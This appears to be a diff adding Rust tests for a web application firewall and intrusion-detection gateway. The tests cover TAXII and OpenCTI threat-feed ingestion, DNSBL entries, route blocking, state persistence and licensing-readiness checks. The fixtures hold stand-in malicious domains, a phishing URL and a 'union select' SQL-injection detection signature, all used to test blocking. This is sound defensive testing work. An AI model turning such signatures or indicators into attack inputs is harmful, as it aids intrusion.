+            {
+              "type": "indicator",
+              "id": "indicator--eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee",
+              "name": "taxii-bad-domain",
+              "pattern": "[domain-name:value = 'taxii-evil.example']",
+              "pattern_type": "stix",
+              "valid_from": "2024-01-01T00:00:00Z",
+              "confidence": 70
+            }
+          ]
+        }"#;
+        let taxii_app = Router::new().route(
+            "/api1/collections/lab/objects/",
+            axum::routing::get(move || {
+                let body = taxii_body.to_string();
+                async move {
+                    (
+                        StatusCode::OK,
+                        [("content-type", "application/taxii+json;version=2.1")],
+                        body,
+                    )
+                }
+            }),
+        );
+        let taxii_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let taxii_addr = taxii_listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(taxii_listener, taxii_app).into_future());
+
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/taxii/poll",
+                None,
+                &serde_json::json!({
+                    "objects_url": format!("http://{taxii_addr}/api1/collections/lab/objects/")
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/taxii/poll",
+                Some("secret"),
+                &serde_json::json!({
+                    "api_root": format!("http://{taxii_addr}/api1"),
+                    "collection_id": "lab",
+                    "feed_id": "taxii-lab",
+                    "source": "taxii:lab",
+                    "ttl_seconds": 3600,
+                    "username": "analyst",
+                    "password": "not-logged"
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["feed_id"], "taxii-lab");
+        assert!(body["upserted_threats"].as_u64().unwrap() >= 2);
+        assert_eq!(body["upserted_dnsbl"], 1);
+        // Objects URL is returned; credentials must not appear in the response.
+        let response_text = body.to_string();
+        assert!(!response_text.contains("not-logged"));
+        assert!(!response_text.contains("analyst"));
+
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "taxii-evil.example" && t.indicator_type == "domain")
+        );
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "203.0.113.92" && t.indicator_type == "client_ip")
+        );
+
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            freshness
+                .iter()
+                .any(|f| f.feed_id == "taxii-lab" && !f.stale)
+        );
+
+        let route_resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &serde_json::json!({
+                    "id": "taxii-block",
+                    "path_prefix": "/taxii",
+                    "upstream": "mock://x",
+                    "mode": "block",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(route_resp.status(), StatusCode::CREATED);
+        let blocked =
+            app_request(&app, gateway_get_from_ip("/gateway/taxii", "203.0.113.92")).await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+
+        let audit: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "secret"),
+            )
+            .await,
+        )
+        .await;
+        let taxii_audit = audit
+            .iter()
+            .find(|e| e.action == "poll_taxii_collection")
+            .expect("taxii poll audit entry");
+        let audit_text = serde_json::to_string(taxii_audit).unwrap();
+        assert!(!audit_text.contains("not-logged"));
+        assert!(!audit_text.contains("analyst"));
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/threat-intel/taxii/poll")
+        );
+    }
+
+    #[tokio::test]
+    async fn opencti_observable_ingest_updates_threats_dnsbl_and_feed_freshness() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/threat-intel/opencti")
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    r#"{"entities":[{"entity_type":"IPv4-Addr","observable_value":"1.2.3.4"}]}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let export = r#"{
+          "data": {
+            "stixCyberObservables": {
+              "edges": [
+                {
+                  "node": {
+                    "entity_type": "IPv4-Addr",
+                    "observable_value": "203.0.113.93",
+                    "x_opencti_score": 95,
+                    "standard_id": "ipv4-addr--lab"
+                  }
+                },
+                {
+                  "node": {
+                    "entity_type": "Domain-Name",
+                    "observable_value": "opencti-evil.example",
+                    "x_opencti_score": 70
+                  }
+                },
+                {
+                  "node": {
+                    "entity_type": "Url",
+                    "observable_value": "http://opencti-evil.example/phish"
+                  }
+                },
+                {
+                  "node": {
+                    "entity_type": "Text",
+                    "observable_value": "noise"
+                  }
+                }
+              ]
+            }
+          }
+        }"#;
+        let response = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri(
+                    "/api/threat-intel/opencti?feed_id=opencti-lab&source=opencti:lab&ttl_seconds=3600",
+                )
+                .header("content-type", "application/json")
+                .header("x-admin-token", "secret")
+                .body(Body::from(export))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["feed_id"], "opencti-lab");
+        assert!(body["upserted_threats"].as_u64().unwrap() >= 2);
+        assert_eq!(body["upserted_dnsbl"], 1);
+        assert!(body["skipped_objects"].as_u64().unwrap() >= 1);
+
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threats
+                .iter()
+                .any(|t| { t.value == "opencti-evil.example" && t.indicator_type == "domain" })
+        );
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "203.0.113.93" && t.indicator_type == "client_ip")
+        );
+
+        let dnsbl: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(
+            dnsbl
+                .iter()
+                .any(|d| d.address.to_string() == "203.0.113.93")
+        );
+
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            freshness
+                .iter()
+                .any(|f| f.feed_id == "opencti-lab" && !f.stale)
+        );
+
+        let route_resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &serde_json::json!({
+                    "id": "opencti-block",
+                    "path_prefix": "/opencti",
+                    "upstream": "mock://x",
+                    "mode": "block",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(route_resp.status(), StatusCode::CREATED);
+        let blocked = app_request(
+            &app,
+            gateway_get_from_ip("/gateway/opencti", "203.0.113.93"),
+        )
+        .await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/threat-intel/opencti")
+        );
+    }
+
+    #[tokio::test]
+    async fn gateway_covers_monitor_proxy_not_found_and_bad_gateway_paths() {
+        let upstream_app = Router::new().route(
+            "/v1/items",
+            any(|| async { (StatusCode::ACCEPTED, "proxied") }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let upstream_addr = listener.local_addr().unwrap();
+        let upstream_task = tokio::spawn(axum::serve(listener, upstream_app).into_future());
+
+        let unused_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let unused_addr = unused_listener.local_addr().unwrap();
+        drop(unused_listener);
+
+        let raw_listener = StdTcpListener::bind("127.0.0.1:0").unwrap();
+        let raw_addr = raw_listener.local_addr().unwrap();
+        let raw_task = thread::spawn(move || {
+            let (mut stream, _) = raw_listener.accept().unwrap();
+            let mut buffer = [0; 512];
+            let _ = stream.read(&mut buffer);
+            stream
+                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 10\r\n\r\nshort")
+                .unwrap();
+        });
+
+        let state = AppState::new(
+            AppData {
+                routes: vec![
+                    RouteConfig {
+                        id: "mock".to_string(),
+                        path_prefix: "/mock".to_string(),
+                        upstream: "mock://mock".to_string(),
+                        mode: EnforcementMode::Monitor,
+                        enabled: true,
+                        block_threshold: None,
+                    },
+                    RouteConfig {
+                        id: "proxy".to_string(),
+                        path_prefix: "/proxy".to_string(),
+                        upstream: format!("http://{upstream_addr}"),
+                        mode: EnforcementMode::Monitor,
+                        enabled: true,
+                        block_threshold: None,
+                    },
+                    RouteConfig {
+                        id: "down".to_string(),
+                        path_prefix: "/down".to_string(),
+                        upstream: format!("http://{unused_addr}"),
+                        mode: EnforcementMode::Monitor,
+                        enabled: true,
+                        block_threshold: None,
+                    },
+                    RouteConfig {
+                        id: "truncated".to_string(),
+                        path_prefix: "/truncated".to_string(),
+                        upstream: format!("http://{raw_addr}"),
+                        mode: EnforcementMode::Monitor,
+                        enabled: true,
+                        block_threshold: None,
+                    },
+                ],
+                threats: Vec::new(),
+                operator_threat_keys: Vec::new(),
+                dnsbl: Vec::new(),
+                events: Vec::new(),
+                next_event_id: 1,
+                audit_logs: Vec::new(),
+                next_audit_log_id: 1,
+                commercial: CommercialProfile::seeded(),
+                threat_feeds: Vec::new(),
+                threat_feed_ownership: Vec::new(),
+            },
+            AppConfig {
+                admin_token: None,
+                state_path: None,
+                dnsbl_origin: "dnsbl.local".to_string(),
+                event_limit: 20,
+            },
+        );
+        let app = build_app(state);
+
+        let no_route = app_request(&app, empty_request(Method::GET, "/gateway/none")).await;
+        assert_eq!(no_route.status(), StatusCode::NOT_FOUND);
+
+        let mock_request = Request::builder()
+            .method(Method::GET)
+            .uri("/gateway/mock")
+            .header("x-real-ip", "198.51.100.8")
+            .body(Body::empty())
+            .unwrap();
+        let mock_response = app_request(&app, mock_request).await;
+        assert_eq!(mock_response.status(), StatusCode::OK);
+        assert!(
+            body_text(mock_response)
+                .await
+                .contains("no matching indicator")
+        );
+
+        let proxy_response = app_request(
+            &app,
+            empty_request(Method::GET, "/gateway/proxy/v1/items?ok=1"),
+        )
+        .await;
+        assert_eq!(proxy_response.status(), StatusCode::ACCEPTED);
+        assert_eq!(body_text(proxy_response).await, "proxied");
+
+        let down_response = app_request(&app, empty_request(Method::GET, "/gateway/down")).await;
+        assert_eq!(down_response.status(), StatusCode::BAD_GATEWAY);
+
+        let truncated_response =
+            app_request(&app, empty_request(Method::GET, "/gateway/truncated")).await;
+        assert_eq!(truncated_response.status(), StatusCode::BAD_GATEWAY);
+        raw_task.join().unwrap();
+
+        upstream_task.abort();
+    }
+
+    #[tokio::test]
+    async fn proxy_request_rejects_non_http_upstreams_before_sending() {
+        let state = AppState::seeded(None);
+        let result = proxy_request(
+            &state,
+            &RouteConfig {
+                id: "mock".to_string(),
+                path_prefix: "/mock".to_string(),
+                upstream: "mock://mock".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            },
+            &Method::GET,
+            "/mock",
+            None,
+            Bytes::new(),
+        )
+        .await;
+        assert!(result.is_err());
+        assert!(result.err().unwrap().contains("upstream must use http://"));
+    }
+
+    fn temp_state_path(name: &str) -> PathBuf {
+        let nanos = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_nanos();
+        std::env::temp_dir().join(format!(
+            "waf-ids-ai-soc-{name}-{}-{nanos}.json",
+            std::process::id()
+        ))
+    }
+
+    #[tokio::test]
+    async fn loads_missing_state_file_from_seed_and_persists_it() {
+        let path = temp_state_path("seed");
+        let state = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: Some(path.clone()),
+            dnsbl_origin: "dnsbl.example.".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+
+        let data = state.inner.read().await;
+        assert_eq!(data.routes[0].id, "demo");
+        drop(data);
+
+        let persisted = fs::read_to_string(&path).await.unwrap();
+        assert!(persisted.contains("\"next_event_id\": 1"));
+        assert!(persisted.contains("\"demo\""));
+        let _ = fs::remove_file(path).await;
+    }
+
+    #[tokio::test]
+    async fn persists_management_upserts_to_state_file() {
+        let path = temp_state_path("upsert");
+        let state = AppState::load(AppConfig {
+            admin_token: Some("secret".to_string()),
+            state_path: Some(path.clone()),
+            dnsbl_origin: "dnsbl.example".to_string(),
+            event_limit: 10,
+        })
+        .await
+        .unwrap();
+
+        state
+            .mutate_and_persist(|data| {
+                upsert_route(
+                    &mut data.routes,
+                    RouteConfig {
+                        id: "api".to_string(),
+                        path_prefix: "/api".to_string(),
+                        upstream: "mock://api".to_string(),
+                        mode: EnforcementMode::Block,
+                        enabled: true,
+                        block_threshold: None,
+                    },
+                );
+            })
+            .await
+            .unwrap();
+
+        let loaded: AppData =
+            serde_json::from_str(&fs::read_to_string(&path).await.unwrap()).unwrap();
+        assert_eq!(
+            loaded
+                .routes
+                .iter()
+                .filter(|route| route.id == "api")
+                .count(),
+            1
+        );
+        assert_eq!(
+            loaded
+                .routes
+                .iter()
+                .find(|route| route.id == "api")
+                .unwrap()
+                .mode,
+            EnforcementMode::Block
+        );
+        let _ = fs::remove_file(path).await;
+    }
+
+    #[test]
+    fn upserts_threats_and_dnsbl_entries_by_stable_keys() {
+        let mut threats = vec![ThreatIndicator {
+            value: "union select".to_string(),
+            indicator_type: "sqli".to_string(),
+            severity: Severity::High,
+            source: "unit".to_string(),
+            ttl_seconds: 60,
+        }];
+
+        upsert_threat(
+            &mut threats,
+            ThreatIndicator {
+                value: "union select".to_string(),
+                indicator_type: "sqli".to_string(),
+                severity: Severity::Critical,
+                source: "unit".to_string(),
+                ttl_seconds: 120,
+            },
+        );
+
+        assert_eq!(threats.len(), 1);
+        assert_eq!(threats[0].severity, Severity::Critical);
+        assert_eq!(threats[0].ttl_seconds, 120);
+
+        let mut dnsbl = vec![DnsblEntry {
+            address: "203.0.113.10".parse().unwrap(),
+            code: "127.0.0.2".to_string(),
+            reason: "scanner".to_string(),
+            source: "unit".to_string(),
+            ttl_seconds: 300,
+            prefix_len: None,
+        }];
+
+        upsert_dnsbl(
+            &mut dnsbl,
+            DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.3".to_string(),
+                reason: "botnet".to_string(),
+                source: "feed".to_string(),
+                ttl_seconds: 600,
+                prefix_len: None,
+            },
+        );
+
+        assert_eq!(dnsbl.len(), 1);
+        assert_eq!(dnsbl[0].code, "127.0.0.3");
+        assert_eq!(dnsbl[0].reason, "botnet");
+
+        let mut feeds = vec![ThreatFeedStatus {
+            feed_id: "feed-a".to_string(),
+            source: "misp://old".to_string(),
+            last_updated_unix: 1,
+            threat_count: 1,
+            dnsbl_count: 0,
+            ttl_seconds: 60,
+        }];
+
+        upsert_threat_feed(
+            &mut feeds,
+            ThreatFeedStatus {
+                feed_id: "feed-a".to_string(),
+                source: "misp://new".to_string(),
+                last_updated_unix: 2,
+                threat_count: 2,
+                dnsbl_count: 1,
+                ttl_seconds: 120,
+            },
+        );
+        upsert_threat_feed(
+            &mut feeds,
+            ThreatFeedStatus {
+                feed_id: "feed-b".to_string(),
+                source: "taxii://new".to_string(),
+                last_updated_unix: 3,
+                threat_count: 1,
+                dnsbl_count: 1,
+                ttl_seconds: 300,
+            },
+        );
+
+        assert_eq!(feeds.len(), 2);
+        assert_eq!(feeds[0].source, "misp://new");
+        assert_eq!(feeds[1].feed_id, "feed-b");
+    }
+
+    #[test]
+    fn rejects_incomplete_management_records() {
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: " ".to_string(),
+                path_prefix: "/api".to_string(),
+                upstream: "mock://api".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route id is required")
+        );
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: "bad-path".to_string(),
+                path_prefix: "api".to_string(),
+                upstream: "mock://api".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route path_prefix must start with /")
+        );
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: "bad-query".to_string(),
+                path_prefix: "/api?debug=true".to_string(),
+                upstream: "mock://api".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route path_prefix must not contain query or fragment characters")
+        );
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: "bad-fragment".to_string(),
+                path_prefix: "/api#frag".to_string(),
+                upstream: "mock://api".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route path_prefix must not contain query or fragment characters")
+        );
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: "no-upstream".to_string(),
+                path_prefix: "/api".to_string(),
+                upstream: " ".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route upstream is required")
+        );
+        assert_eq!(
+            validate_threat(&ThreatIndicator {
+                value: " ".to_string(),
+                indicator_type: "sqli".to_string(),
+                severity: Severity::High,
+                source: "unit".to_string(),
+                ttl_seconds: 60,
+            }),
+            Err("threat indicator value is required")
+        );
+        assert_eq!(
+            validate_threat(&ThreatIndicator {
+                value: "union select".to_string(),
+                indicator_type: " ".to_string(),
+                severity: Severity::High,
+                source: "unit".to_string(),
+                ttl_seconds: 60,
+            }),
+            Err("threat indicator type is required")
+        );
+        assert_eq!(
+            validate_threat(&ThreatIndicator {
+                value: "union select".to_string(),
+                indicator_type: "sqli".to_string(),
+                severity: Severity::High,
+                source: " ".to_string(),
+                ttl_seconds: 60,
+            }),
+            Err("threat indicator source is required")
+        );
+        assert_eq!(
+            validate_threat(&ThreatIndicator {
+                value: "union select".to_string(),
+                indicator_type: "sqli".to_string(),
+                severity: Severity::High,
+                source: "unit".to_string(),
+                ttl_seconds: 0,
+            }),
+            Err("threat indicator ttl_seconds must be greater than 0")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.2".to_string(),
+                reason: " ".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }),
+            Err("DNSBL reason is required")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.2".to_string(),
+                reason: "scanner".to_string(),
+                source: " ".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }),
+            Err("DNSBL source is required")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.2".to_string(),
+                reason: "scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 0,
+                prefix_len: None,
+            }),
+            Err("DNSBL ttl_seconds must be greater than 0")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "192.0.2.1".to_string(),
+                reason: "scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }),
+            Err("DNSBL response code must be in 127.0.0.0/8")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "::1".to_string(),
+                reason: "scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }),
+            Err("DNSBL response code must be an IPv4 loopback address")
+        );
+        assert_eq!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "not-ip".to_string(),
+                reason: "scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            }),
+            Err("DNSBL response code must be an IP address")
+        );
+        assert_eq!(
+            validate_route(&RouteConfig {
+                id: "bad".to_string(),
+                path_prefix: "/api".to_string(),
+                upstream: "ftp://origin".to_string(),
+                mode: EnforcementMode::Monitor,
+                enabled: true,
+                block_threshold: None,
+            }),
+            Err("route upstream must start with mock://, http://, or https://")
+        );
+        assert!(validate_route(&route()).is_ok());
+        assert!(
+            validate_threat(&ThreatIndicator {
+                value: "union select".to_string(),
+                indicator_type: "sqli".to_string(),
+                severity: Severity::High,
+                source: "unit".to_string(),
+                ttl_seconds: 60,
+            })
+            .is_ok()
+        );
+        assert!(
+            validate_dnsbl(&DnsblEntry {
+                address: "203.0.113.10".parse().unwrap(),
+                code: "127.0.0.2".to_string(),
+                reason: "scanner".to_string(),
+                source: "unit".to_string(),
+                ttl_seconds: 300,
+                prefix_len: None,
+            })
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn validates_commercial_profiles_and_threat_feed_imports() {
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                tenant_id: " ".to_string(),
+                ..enterprise_profile()
+            }),
+            Err("commercial tenant_id is required")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                deployment_id: " ".to_string(),
+                ..enterprise_profile()
+            }),
+            Err("commercial deployment_id is required")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                support_contact: " ".to_string(),
+                ..enterprise_profile()
+            }),
+            Err("commercial support_contact is required")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                features: Vec::new(),
+                ..enterprise_profile()
+            }),
+            Err("commercial features must not be empty")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                licensed_node_count: Some(0),
+                ..enterprise_profile()
+            }),
+            Err("commercial licensed_node_count must be greater than 0")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                license_id: Some(" ".to_string()),
+                ..enterprise_profile()
+            }),
+            Err("commercial license_id is required for active or evaluation licenses")
+        );
+        assert_eq!(
+            validate_commercial_profile(&CommercialProfile {
+                licensee: None,
+                ..enterprise_profile()
+            }),
+            Err("commercial licensee is required for active or evaluation licenses")
+        );
+        assert!(validate_commercial_profile(&enterprise_profile()).is_ok());
+        assert!(
+            validate_commercial_profile(&CommercialProfile {
+                license_status: LicenseStatus::Expired,
+                license_id: None,
+                licensee: None,
+                ..CommercialProfile::seeded()
+            })
+            .is_ok()
+        );
+
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                feed_id: " ".to_string(),
+                ..threat_feed_import()
+            }),
+            Err("threat feed_id is required")
+        );
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                source: " ".to_string(),
+                ..threat_feed_import()
+            }),
+            Err("threat feed source is required")
+        );
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                ttl_seconds: 0,
+                ..threat_feed_import()
+            }),
+            Err("threat feed ttl_seconds must be greater than 0")
+        );
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                threats: Vec::new(),
+                dnsbl: Vec::new(),
+                ..threat_feed_import()
+            }),
+            Err("threat feed must include at least one threat or DNSBL entry")
+        );
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                threats: vec![ThreatIndicator {
+                    value: " ".to_string(),
+                    indicator_type: "malware".to_string(),
+                    severity: Severity::Critical,
+                    source: "unit".to_string(),
+                    ttl_seconds: 60,
+                }],
+                ..threat_feed_import()
+            }),
+            Err("threat indicator value is required")
+        );
+        assert_eq!(
+            validate_threat_feed_import(&ThreatFeedImport {
+                dnsbl: vec![DnsblEntry {
+                    address: "203.0.113.10".parse().unwrap(),
+                    code: "not-ip".to_string(),
+                    reason: "scanner".to_string(),
+                    source: "unit".to_string(),
+                    ttl_seconds: 300,
+                    prefix_len: None,
+                }],
+                ..threat_feed_import()
+            }),
+            Err("DNSBL response code must be an IP address")
+        );
+        assert!(validate_threat_feed_import(&threat_feed_import()).is_ok());
+    }
+
+    #[test]
+    fn legacy_state_json_defaults_commercial_fields() {
+        let legacy = r#"{
+          "routes": [],
+          "threats": [],
+          "dnsbl": [],
+          "events": [],
+          "next_event_id": 7
+        }"#;
+        let loaded: AppData = serde_json::from_str(legacy).unwrap();
+        assert_eq!(loaded.next_event_id, 7);
+        assert_eq!(loaded.commercial.tenant_id, "local-lab");
+        assert_eq!(loaded.commercial.license_status, LicenseStatus::Unlicensed);
+        assert!(loaded.threat_feeds.is_empty());
+    }
+
+    #[test]
+    fn readiness_rejects_blank_license_and_accepts_dnsbl_only_feeds() {
+        let mut data = AppData::seeded();
+        data.threats.clear();
+        data.commercial = CommercialProfile {
+            license_id: Some(" ".to_string()),
+            ..enterprise_profile()
+        };
+        data.threat_feeds = vec![ThreatFeedStatus {
+            feed_id: "dnsbl-only".to_string(),
+            source: "misp://dnsbl".to_string(),
+            last_updated_unix: 1,
+            threat_count: 0,
+            dnsbl_count: 1,
+            ttl_seconds: 600,
+        }];
+        data.events.push(SecurityEvent {
+            id: 1,
+            timestamp_unix: 1,
+            client_ip: None,
+            route_id: Some("demo".to_string()),
+            action: "monitored".to_string(),
+            reason: "unit".to_string(),
+            score: 0,
+            path: "/demo".to_string(),
+        });
+
+        let blocked = commercial_readiness_snapshot_at(&data, 1);
+        assert!(!blocked.ready_for_enterprise_sale);
+        assert!(blocked.blockers.iter().any(|item| item == "license"));
+
+        data.commercial.license_id = Some("LIC-2B-KRW-0001".to_string());
+        let ready = commercial_readiness_snapshot_at(&data, 1);
+        assert!(ready.ready_for_enterprise_sale);
+
+        let stale = commercial_readiness_snapshot_at(&data, 601);
+        assert!(!stale.ready_for_enterprise_sale);
+        assert!(
+            stale
+                .blockers
+                .iter()
+                .any(|item| item == "threat_feed_updates")
+        );
+        let freshness = threat_feed_freshness_snapshot(&data.threat_feeds, 601);
+        assert!(freshness[0].stale);
+        assert_eq!(freshness[0].expires_at_unix, 601);
+
+        let wrapper_kpis = waf_ids_core::kpi_snapshot(&data);
+        assert_eq!(wrapper_kpis.route_count, data.routes.len());
+        let wrapper_readiness = waf_ids_core::commercial_readiness_snapshot(&data);
+        assert_eq!(
+            wrapper_readiness.target_sale_value_krw,
+            TARGET_SALE_VALUE_KRW
+        );
+        let wrapper_manifest = waf_ids_core::buyer_evidence_manifest(&data);
+        assert_eq!(
+            wrapper_manifest.target_sale_value_krw,
+            TARGET_SALE_VALUE_KRW
+        );
+
+        let manifest = waf_ids_core::buyer_evidence_manifest_at(&data, 1);
+        assert!(manifest.ready_for_enterprise_sale);
+        assert_eq!(manifest.runtime_counts.dnsbl_entry_count, data.dnsbl.len());
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.id == "dnsbl_zone" && endpoint.required_for_sale)
+        );
+
+        let stale_manifest = waf_ids_core::buyer_evidence_manifest_at(&data, 601);
+        assert!(!stale_manifest.ready_for_enterprise_sale);
+        assert!(
+            stale_manifest
+                .blockers
+                .iter()
+                .any(|item| item == "threat_feed_updates")
+        );
+    }
+
+    #[test]
+    fn exports_security_events_as_ndjson() {
+        let events = vec![SecurityEvent {
+            id: 1,
+            timestamp_unix: 10,
+            client_ip: Some("198.51.100.7".parse().unwrap()),
+            route_id: Some("demo".to_string()),
+            action: "blocked".to_string(),
+            reason: "unit".to_string(),
+            score: 100,
+            path: "/demo".to_string(),
+        }];
+
+        let export = export_events_ndjson(&events).unwrap();
+        assert_eq!(export.lines().count(), 1);
+        assert!(export.ends_with('\n'));
+        assert!(export.contains(r#""action":"blocked""#));
+    }
+
+    #[tokio::test]
+    async fn events_ndjson_serialization_errors_are_operator_visible() {
+        let response =
+            events_ndjson_response(Err(serde_json::Error::io(std::io::Error::other("boom"))));
+
+        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);
+        assert!(body_text(response).await.contains("failed to serialize"));
+    }
+
+    #[tokio::test]
+    async fn defaults_scoring_and_state_error_paths_are_explicit() {
+        let seeded = AppState::seeded(None);
+        assert_eq!(seeded.health_status().persistence, "memory");
+
+        let loaded = AppState::load(AppConfig::memory(None)).await.unwrap();
+        assert_eq!(loaded.health_status().dnsbl_origin, "dnsbl.local");
+
+        let minimum = AppState::load(AppConfig {
+            admin_token: None,
+            state_path: None,
+            dnsbl_origin: " . ".to_string(),
+            event_limit: 0,
+        })
+        .await
+        .unwrap();
+        assert_eq!(minimum.health_status().dnsbl_origin, "dnsbl.local");
+        assert_eq!(minimum.health_status().event_limit, 1);
+
+        let score = score_request(
+            "/login",
+            None,
+            "alpha beta",
+            None,
+            &[
+                ThreatIndicator {
+                    value: "alpha".to_string(),
+                    indicator_type: "low".to_string(),
+                    severity: Severity::Low,
+                    source: "unit".to_string(),
+                    ttl_seconds: 60,
+                },
+                ThreatIndicator {
+                    value: "beta".to_string(),
+                    indicator_type: "medium".to_string(),
+                    severity: Severity::Medium,
+                    source: "unit".to_string(),
+                    ttl_seconds: 60,
+                },
+            ],
+            &[],
+        );
+        assert_eq!(score.score, 35);
+
+        let mut headers = HeaderMap::new();
+        headers.insert("x-forwarded-for", HeaderValue::from_static("not-an-ip"));
+        assert_eq!(client_ip_from_headers(&headers), None);
+
+        let valid_path = temp_state_path("valid-load");
+        fs::write(
+            &valid_path,
